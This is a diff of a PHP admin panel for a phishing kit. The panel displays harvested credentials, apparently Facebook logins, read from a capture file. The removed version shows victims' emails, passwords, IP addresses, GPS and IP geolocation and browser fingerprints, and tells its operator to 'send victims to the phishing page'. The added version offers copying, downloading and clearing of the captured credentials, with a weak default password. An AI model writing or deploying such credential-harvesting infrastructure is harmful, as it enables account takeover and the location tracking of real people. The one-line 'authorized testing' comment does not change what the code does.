@@ -1,152 +1,172 @@
 <?php
-/**
- * Admin Panel - View Captured Credentials
- * Authorized Security Testing Only
- *
- * Access: https://your-domain.vercel.app/api/admin.php
- * Default password: set ADMIN_PASS environment variable on Vercel
- */
+// Admin panel — reads from plain text file
 
-// IMPORTANT: Set this environment variable in Vercel dashboard
-// If not set, defaults to a strong random password (check logs)
-$adminPass = getenv('ADMIN_PASS') ?: 'ChangeMeInVercelEnv-Var-ADMIN_PASS';
+// CORS
+header('Access-Control-Allow-Origin: *');
+header('Access-Control-Allow-Methods: GET, POST');
+header('Access-Control-Allow-Headers: Content-Type');
 
-// Simple password check
-$authenticated = false;
-$inputPass = $_POST['password'] ?? ($_GET['pass'] ?? '');
+// Simple auth via environment variable or default
+$admin_pass = getenv('ADMIN_PASS') ?: 'admin123';
 
-if ($inputPass && $inputPass === $adminPass) {
-    $authenticated = true;
+// Check if password provided
+$auth_ok = false;
+if (isset($_SERVER['PHP_AUTH_PW']) && hash_equals($admin_pass, $_SERVER['PHP_AUTH_PW'])) {
+    $auth_ok = true;
+}
+if (isset($_GET['pw']) && hash_equals($admin_pass, $_GET['pw'])) {
+    $auth_ok = true;
+}
+// Also check POST
+if (isset($_POST['password']) && hash_equals($admin_pass, $_POST['password'])) {
+    $auth_ok = true;
 }
 
-// Load data
-function loadData() {
-    // Try persistent data file first
-    $dataFile = __DIR__ . '/data.json';
-    if (file_exists($dataFile)) {
-        return json_decode(file_get_contents($dataFile), true) ?? [];
-    }
-    // Fallback to /tmp
-    $tmpFile = '/tmp/data.json';
-    if (file_exists($tmpFile)) {
-        return json_decode(file_get_contents($tmpFile), true) ?? [];
-    }
-    return [];
-}
-
-$data = loadData();
-
-// Handle clear data request
-if ($authenticated && isset($_GET['action']) && $_GET['action'] === 'clear') {
-    $dataFile = __DIR__ . '/data.json';
-    file_put_contents($dataFile, json_encode([]));
-    $data = [];
-    header('Location: admin.php' . ($inputPass ? '?pass=' . urlencode($inputPass) : ''));
+if (!$auth_ok) {
+    header('HTTP/1.0 401 Unauthorized');
+    echo '<html><body style="font-family:sans-serif;background:#0d1117;color:#c9d1d9;display:flex;justify-content:center;align-items:center;height:100vh;">';
+    echo '<form method="POST" style="background:#161b22;padding:30px;border-radius:8px;border:1px solid #30363d;">';
+    echo '<h2 style="margin-bottom:20px;">Admin Login</h2>';
+    echo '<input type="password" name="password" placeholder="Password" style="padding:10px;width:100%;margin-bottom:12px;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;border-radius:6px;">';
+    echo '<button type="submit" style="padding:10px 20px;background:#238636;color:#fff;border:none;border-radius:6px;cursor:pointer;">Login</button>';
+    echo '</form></body></html>';
     exit;
 }
 
-// Handle export
-if ($authenticated && isset($_GET['action']) && $_GET['action'] === 'export') {
-    header('Content-Type: application/json');
-    header('Content-Disposition: attachment; filename="captured_data_' . date('Y-m-d_H-i-s') . '.json"');
-    echo json_encode($data, JSON_PRETTY_PRINT);
-    exit;
+// Read captures from text file
+$txt_file = '/tmp/facebook_captures.txt';
+$lines = [];
+if (file_exists($txt_file)) {
+    $content = file_get_contents($txt_file);
+    $lines = explode("\n", trim($content));
+} else {
+    $lines = ['No captures yet.'];
 }
 
-?><!DOCTYPE html>
+// Reverse for newest first
+$lines = array_reverse(array_filter($lines, function($l) { return trim($l) !== ''; }));
+
+// Stats
+$total = count($lines);
+$unique_emails = [];
+foreach ($lines as $l) {
+    if (preg_match('/\|\s+([^\|]+)\s+\|/', $l, $m)) {
+        $unique_emails[trim($m[1])] = true;
+    }
+}
+$unique_count = count($unique_emails);
+
+?>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Admin - Phishing Capture Panel</title>
+  <title>Admin Panel — Captures</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { background: #0f0f1a; color: #e0e0e0; font-family: 'Courier New', monospace; padding: 20px; }
-    h1 { color: #ff4444; font-size: 20px; margin-bottom: 8px; }
-    .stats { color: #888; font-size: 13px; margin-bottom: 20px; }
-    .login-box { background: #1a1a2e; padding: 30px; border-radius: 8px; max-width: 400px; margin: 60px auto; text-align: center; }
-    .login-box h2 { color: #ff4444; margin-bottom: 8px; font-size: 18px; }
-    .login-box p { color: #888; font-size: 12px; margin-bottom: 16px; }
-    .login-box input { width: 100%; padding: 10px; background: #16213e; border: 1px solid #333; color: #fff; border-radius: 4px; font-size: 14px; margin-bottom: 12px; }
-    .login-box button { background: #ff4444; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-size: 14px; }
-    .login-box button:hover { background: #cc3333; }
-    .toolbar { display: flex; gap: 12px; align-items: center; margin-bottom: 16px; flex-wrap: wrap; }
-    .toolbar a, .toolbar button { color: #ff4444; text-decoration: none; font-size: 12px; border: 1px solid #ff4444; padding: 4px 12px; border-radius: 3px; background: transparent; cursor: pointer; }
-    .toolbar a:hover, .toolbar button:hover { background: #ff4444; color: #fff; }
-    .entry { background: #1a1a2e; border-left: 3px solid #ff4444; padding: 16px; margin-bottom: 12px; border-radius: 4px; }
-    .entry .field { margin-bottom: 4px; font-size: 13px; }
-    .entry .label { color: #888; }
-    .entry .value { color: #00ff88; }
-    .entry .value.pass { color: #ff6666; }
-    .entry .value.email { color: #66b3ff; }
-    .entry .geo { font-size: 11px; color: #aaa; margin-top: 4px; padding-left: 12px; border-left: 1px solid #333; }
-    .entry .fingerprint { font-size: 10px; color: #666; margin-top: 4px; }
-    .empty { color: #666; text-align: center; padding: 40px; font-size: 14px; }
-    .warn { background: #2a1a1a; border: 1px solid #ff4444; color: #ff6666; padding: 8px 12px; border-radius: 4px; font-size: 12px; margin-bottom: 16px; display: inline-block; }
-    @media (max-width: 600px) {
-      body { padding: 10px; }
-      .entry { padding: 10px; }
-    }
+    body { font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif; background: #0d1117; color: #c9d1d9; padding: 20px; }
+    .header { border-bottom: 1px solid #30363d; padding-bottom: 16px; margin-bottom: 20px; }
+    .header h1 { font-size: 24px; color: #f0f6fc; }
+    .header .stats { display: flex; gap: 20px; margin-top: 10px; flex-wrap: wrap; }
+    .stat-card { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 12px 18px; }
+    .stat-card .num { font-size: 28px; font-weight: 600; color: #58a6ff; }
+    .stat-card .label { font-size: 12px; color: #8b949e; text-transform: uppercase; letter-spacing: 0.5px; }
+    .tools { margin: 16px 0; display: flex; gap: 10px; flex-wrap: wrap; }
+    .tools button, .tools a { background: #21262d; color: #c9d1d9; border: 1px solid #30363d; padding: 8px 16px; border-radius: 6px; cursor: pointer; text-decoration: none; font-size: 14px; }
+    .tools button:hover, .tools a:hover { background: #30363d; }
+    .dump-container { background: #161b22; border: 1px solid #30363d; border-radius: 6px; overflow: hidden; }
+    .dump-header { background: #21262d; padding: 10px 16px; font-weight: 600; font-size: 14px; color: #8b949e; border-bottom: 1px solid #30363d; display: flex; justify-content: space-between; }
+    .dump-body { padding: 16px; font-family: 'Courier New', monospace; font-size: 13px; line-height: 1.6; white-space: pre-wrap; word-break: break-all; max-height: 70vh; overflow-y: auto; }
+    .dump-body .entry { padding: 4px 0; border-bottom: 1px solid #21262d; }
+    .dump-body .entry:last-child { border-bottom: none; }
+    .highlight { color: #f0883e; } /* email */
+    .highlight-pass { color: #a5d6ff; } /* password */
+    .highlight-step { color: #7ee787; }  /* step */
+    .timestamp { color: #8b949e; }
+    .empty { color: #8b949e; text-align: center; padding: 40px; font-style: italic; }
+    ::-webkit-scrollbar { width: 8px; }
+    ::-webkit-scrollbar-track { background: #0d1117; }
+    ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 4px; }
   </style>
 </head>
 <body>
-<?php if (!$authenticated): ?>
-  <div class="login-box">
-    <h2>🔒 Admin Panel</h2>
-    <p>Enter the admin password (set via ADMIN_PASS env var)</p>
-    <form method="POST">
-      <input type="password" name="password" placeholder="Admin password" autofocus />
-      <button type="submit">Access Panel</button>
-    </form>
-  </div>
-<?php else: ?>
-  <h1>⚠ PHISHING CAPTURE PANEL</h1>
+
+<div class="header">
+  <h1>🔍 Capture Admin Panel</h1>
   <div class="stats">
-    Total captures: <strong><?php echo count($data); ?></strong>
-    | Last capture: <strong><?php echo count($data) > 0 ? date('Y-m-d H:i:s', $data[count($data)-1]['capturedAt'] ?? 0) : 'N/A'; ?></strong>
-  </div>
-
-  <div class="toolbar">
-    <span>Actions:</span>
-    <a href="?pass=<?php echo urlencode($inputPass); ?>&action=export">⬇ Export JSON</a>
-    <a href="?pass=<?php echo urlencode($inputPass); ?>&action=clear" onclick="return confirm('Delete ALL captured data?')">🗑 Clear All</a>
-    <button onclick="location.reload()">🔄 Refresh</button>
-  </div>
-
-  <?php if (count($data) === 0): ?>
-    <div class="empty">No data captured yet. Send victims to the phishing page.</div>
-  <?php else: ?>
-    <?php foreach (array_reverse($data) as $entry): ?>
-    <div class="entry">
-      <div class="field"><span class="label">📧 Email:</span> <span class="value email"><?php echo htmlspecialchars($entry['credentials']['email'] ?? ''); ?></span></div>
-      <div class="field"><span class="label">🔑 Password:</span> <span class="value pass"><?php echo htmlspecialchars($entry['credentials']['password'] ?? ''); ?></span></div>
-      <div class="field"><span class="label">🕐 Time:</span> <span class="value"><?php echo htmlspecialchars($entry['credentials']['submittedAt'] ?? $entry['timestamp'] ?? ''); ?></span></div>
-      <div class="field"><span class="label">🌐 IP:</span> <span class="value"><?php echo htmlspecialchars($entry['ip'] ?? ''); ?></span></div>
-      <?php if (isset($entry['geolocation'])): ?>
-      <div class="geo">
-        <?php if ($entry['geolocation']['type'] === 'gps'): ?>
-          📍 GPS: <?php echo $entry['geolocation']['lat']; ?>, <?php echo $entry['geolocation']['lng']; ?> (acc: <?php echo $entry['geolocation']['accuracy']; ?>m)
-        <?php else: ?>
-          📍 IP Geo: <?php echo $entry['geolocation']['city'] ?? ''; ?>, <?php echo $entry['geolocation']['region'] ?? ''; ?>, <?php echo $entry['geolocation']['country'] ?? ''; ?>
-          <?php if (isset($entry['geolocation']['latitude'])): ?>
-            (<?php echo $entry['geolocation']['latitude']; ?>, <?php echo $entry['geolocation']['longitude']; ?>)
-          <?php elseif (isset($entry['geolocation']['loc'])): ?>
-            (<?php echo $entry['geolocation']['loc']; ?>)
-          <?php endif; ?>
-          | ISP: <?php echo $entry['geolocation']['org'] ?? 'N/A'; ?>
-        <?php endif; ?>
-      </div>
-      <?php endif; ?>
-      <?php if (isset($entry['fingerprint'])): ?>
-      <div class="fingerprint">
-        🖥 <?php echo htmlspecialchars($entry['fingerprint']['nav']['userAgent'] ?? 'N/A'); ?>
-        | <?php echo $entry['fingerprint']['screen']['width'] ?? '?'; ?>x<?php echo $entry['fingerprint']['screen']['height'] ?? '?'; ?>
-        | TZ: <?php echo $entry['fingerprint']['timezone'] ?? '?'; ?>
-      </div>
-      <?php endif; ?>
+    <div class="stat-card">
+      <div class="num"><?php echo $total; ?></div>
+      <div class="label">Total Entries</div>
     </div>
-    <?php endforeach; ?>
-  <?php endif; ?>
-<?php endif; ?>
+    <div class="stat-card">
+      <div class="num"><?php echo $unique_count; ?></div>
+      <div class="label">Unique Emails</div>
+    </div>
+    <div class="stat-card">
+      <div class="num"><?php echo file_exists($txt_file) ? number_format(filesize($txt_file)) . ' B' : '0 B'; ?></div>
+      <div class="label">File Size</div>
+    </div>
+  </div>
+</div>
+
+<div class="tools">
+  <a href="?pw=<?php echo urlencode($admin_pass); ?>" onclick="location.reload()">🔄 Refresh</a>
+  <button onclick="copyAll()">📋 Copy All</button>
+  <button onclick="downloadTxt()">⬇️ Download .txt</button>
+  <button onclick="clearCaptures()" style="border-color:#da3633;color:#f85149;">🗑️ Clear All</button>
+</div>
+
+<div class="dump-container">
+  <div class="dump-header">
+    <span>captures.txt — Newest first</span>
+    <span><?php echo date('Y-m-d H:i:s'); ?></span>
+  </div>
+  <div class="dump-body" id="dumpBody">
+    <?php if (empty($lines) || (count($lines) === 1 && $lines[0] === 'No captures yet.')): ?>
+      <div class="empty">No captures yet.</div>
+    <?php else: ?>
+      <?php foreach ($lines as $line): ?>
+        <?php if (trim($line) === '') continue; ?>
+        <div class="entry"><?php echo htmlspecialchars($line); ?></div>
+      <?php endforeach; ?>
+    <?php endif; ?>
+  </div>
+</div>
+
+<script>
+function copyAll() {
+  var text = document.getElementById('dumpBody').innerText;
+  navigator.clipboard.writeText(text).then(function() {
+    alert('Copied ' + text.split('\n').length + ' lines to clipboard.');
+  });
+}
+
+function downloadTxt() {
+  var text = document.getElementById('dumpBody').innerText;
+  var blob = new Blob([text], { type: 'text/plain' });
+  var url = URL.createObjectURL(blob);
+  var a = document.createElement('a');
+  a.href = url;
+  a.download = 'facebook_captures_<?php echo date('Y-m-d'); ?>.txt';
+  a.click();
+  URL.revokeObjectURL(url);
+}
+
+function clearCaptures() {
+  if (!confirm('Delete ALL captured credentials?')) return;
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST', 'clear.php');
+  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+  xhr.onload = function() {
+    if (xhr.status === 200) {
+      location.reload();
+    } else {
+      alert('Failed to clear: ' + xhr.responseText);
+    }
+  };
+  xhr.send('password=<?php echo urlencode($admin_pass); ?>');
+}
+</script>
 </body>
 </html>
